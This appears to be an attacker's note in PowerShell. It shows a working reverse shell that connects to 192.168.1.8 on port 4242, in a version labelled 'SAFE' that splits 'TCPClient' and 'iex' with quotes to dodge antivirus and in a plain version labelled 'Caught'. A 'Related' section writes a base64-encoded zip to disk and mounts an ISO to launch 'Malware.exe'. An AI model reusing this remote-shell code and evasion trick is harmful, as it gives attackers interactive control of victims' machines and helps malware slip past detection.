# SAFE:
```powershell
$client = New-Object System.Net.Sockets.T'CPC'lient('192.168.1.8',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i'e'x $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

# Caught:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.1.8',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

# Related:
```powershell
$FileName3 = 'Powershell3.zip';[IO.File]::WriteAllBytes($FileName3, [Convert]::FromBase64String('UEsDBBQAAAAIAIMBZVWbYo0JIAAAACwAAAAIAAAAdGVzdC50eHT7/6+EIZWhmKGEIZMhjyGdQYEBnW/IYMRgzMDLwMUAAFBLAQIUABQAAAAIAIMBZVWbYo0JIAAAACwAAAAIAAAAAAAAAAAAAAAAAAAAAAB0ZXN0LnR4dFBLBQYAAAAAAQABADYAAABGAAAAAAA='))

Mount-DiskImage C:\Media\Filename.ISO

powershell -command dismount-diskimage -imagepath "F:\"
powershell -command mount-diskimage -imagepath "N:\Games\ISOs\PoohRTR.iso"
start N:\FlynnGames\PoohRTR\PoohRTR.exe

$MountedISOs=Mount-DiskImage -PassThru D:\Downloads\Ubuntu.iso,D:\Downloads\Windows8.iso,D:\Downloads\Server2012.iso
foreach($iso in $MountedISOs){Get-Volume -DiskImage $iso}
start wubi.exe

$path=$PWD.path
Mount-DiskImage $path\Filename.ISO
start $path\Filename\Malware.exe
```




